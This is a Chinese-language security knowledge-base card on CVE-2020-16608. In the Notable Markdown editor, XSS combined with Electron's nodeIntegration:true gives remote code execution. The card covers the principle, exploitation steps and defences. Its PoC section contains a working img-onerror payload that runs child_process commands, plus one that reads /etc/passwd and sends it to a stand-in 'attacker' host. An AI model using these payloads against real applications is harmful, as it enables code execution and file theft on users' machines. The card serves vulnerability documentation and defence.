---
id: web-generic-xss-electron-nodeintegration-renderer-rce
title: Electron nodeIntegration:true + 渲染进程 XSS：页面脚本直接 require('child_process') 执行命令（CVE-2020-16608 Notable 编辑器为例）
type: scenario
domain: web
path: web/generic/xss
technique: electron-nodeintegration-xss-renderer-rce
tags:
- web
- xss
- electron
- nodeintegration
- context-isolation
- cve-2020-16608
- rce
- desktop
cve:
- CVE-2020-16608
severity: critical
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V564
  verified_at: '2026-11-12T08:05:53+08:00'
  notes: 已对照原文与图01核对：图01为Notable应用界面；原文称CVE-2020-16608是markdown编辑器、未过滤XSS可注入<a onmouseover=alert(1)>、BrowserWindow webPreferences nodeIntegration:true且沙箱关闭、img onerror中require(child_process).execSync(calc)即RCE，卡内PoC与配置片段逐字一致；卡片补入Notable名称有图01支撑，CVE-2020-16608按原文。dedup仅自匹配；与contextisolation/preload两卡为related不同配置链，非同链；全库无既有Notable/CVE-2020-16608卡。原文未给具体版本区间（仅称markdown编辑器），未set-versions；未复跑。
url: /docs/web/generic/xss/web-generic-xss-electron-nodeintegration-renderer-rce/
draft: false
kb_aliases:
- Electron XSS RCE
- nodeIntegration true 危害
- CVE-2020-16608
- Notable markdown XSS
- require('child_process') XSS
- Electron 渲染进程命令执行
---

## 一句话结论

Electron 应用若在 `BrowserWindow` 中设置 `webPreferences: { nodeIntegration: true }`，渲染进程页面里的任意 XSS 都直接拥有 Node 能力：`<img src=x onerror="require('child_process').execSync('calc')">` 即可执行系统命令；Notable 等 Markdown 编辑器因未过滤 XSS 且开启 nodeIntegration，使一个 `<a onmouseover="alert(1)">`/`<img onerror>` 就能升级为 RCE（CVE-2020-16608）。

## 原理

- **nodeIntegration 的语义**：开启后，渲染进程（Chromium 页面）的 JavaScript 可以直接访问 Node.js 的 `require`/`process` 等全局能力；页面脚本与本地代码不再隔离。此时"网页 XSS"等价于"在用户电脑上执行任意 Node 代码"。
- **Notable/CVE-2020-16608 的链**：Markdown 编辑器把用户内容直接渲染为 HTML，`<a onmouseover="alert(1)">` 即可执行脚本；`createWindow` 中 `nodeIntegration: true` 且未启用 `contextIsolation`/`sandbox`，于是 `<img src=x onerror="alert(require('child_process').execSync('calc').toString())">` 在渲染进程内以应用权限执行 `calc`。
- **为什么危险**：Electron 应用通常以当前用户权限运行，可读写用户文件、访问内网、执行任意命令；XSS 可能来自导入的 Markdown 文件、剪贴板、同步的笔记、远程内容等，不需要用户主动交互（`onerror`/`onload` 自动触发）。
- **防护演进**：Electron 10+ 默认 `contextIsolation: true`、`nodeIntegration: false`；旧应用或为兼容仍显式开启 nodeIntegration 时风险最大。
- **前提**：应用版本/配置开启 nodeIntegration（或等效地把 `require`/`process` 暴露给页面）；存在可注入 HTML/JS 的渲染路径；未启用严格 CSP/净化。

## 触发条件

- Electron 应用 `BrowserWindow` 配置 `nodeIntegration: true`（常见于旧版 Notable 等编辑器），且 `contextIsolation` 关闭（旧版默认）。
- 应用存在 XSS（Markdown/HTML 渲染未净化、远程内容注入等），或攻击者可让应用加载恶意页面。
- 应用以当前用户权限运行，页面脚本可调用 `require`。

## 利用步骤

1. 识别 Electron 应用与配置：检查 `webPreferences`（`nodeIntegration`/`contextIsolation`/`sandbox`），可通过 `process.versions.electron`/`window.require` 探测。
2. 寻找 XSS 注入点（Markdown 中的 HTML、文件名、同步内容）。
3. 注入自动触发 payload，执行命令或读写文件。
4. 验证：弹计算器/写文件/回显 `execSync` 结果。

## PoC

```html
<!-- Markdown/HTML 注入，自动触发 -->
<img src=x onerror="alert(require('child_process').execSync('calc').toString());">

<!-- 也可直接读本地文件或外带 -->
<img src=x onerror="fetch('http://attacker/?d='+encodeURIComponent(require('fs').readFileSync('/etc/passwd','utf8')))">
```

```javascript
// 目标侧危险配置（供识别）
const win = new BrowserWindow({
  width: 800, height: 600,
  webPreferences: { nodeIntegration: true }   // 危险：渲染进程可 require
});
win.loadFile('index.html');
```

## 变体与关联

- 关联：[[web-generic-xss-desktop-client-xss-showsavefilepicker-bat-rce]]（桌面客户端 XSS 借文件选择器落 bat RCE）、[[web-generic-xss-electron-ipc-curl-file-read-bot-cookie]]（preload 暴露 IPC 能力的另一类 Electron 逃逸）、[[ai-security-agent-security-deepchat-mermaid-xss-ipc-mcp-command-exec]]（Electron 渲染进程 XSS → IPC → spawn）。
- 变体：nodeIntegration 关闭但 preload 暴露 `require`/`ipcRenderer` 危险方法时，XSS 可经桥调用 Node 能力（见相关卡）；Electron 高版本默认配置可阻断本链。
- 边界：`contextIsolation: true` + `sandbox: true` + nodeIntegration false 时本链失效；CSP 禁止内联脚本只能提高门槛，不能替代进程隔离。

## 检测与防御

- **检测**：Electron 应用配置中出现 `nodeIntegration: true`；渲染进程执行 `child_process`/`fs` 相关调用；Markdown 内容含 `<script>`/`onerror`/`onmouseover`。
- **防御**：`nodeIntegration: false`、`contextIsolation: true`、`sandbox: true`；通过 `contextBridge` 仅暴露最小必要 API；对 Markdown/HTML 做白名单净化与 CSP；及时升级 Electron 与依赖。
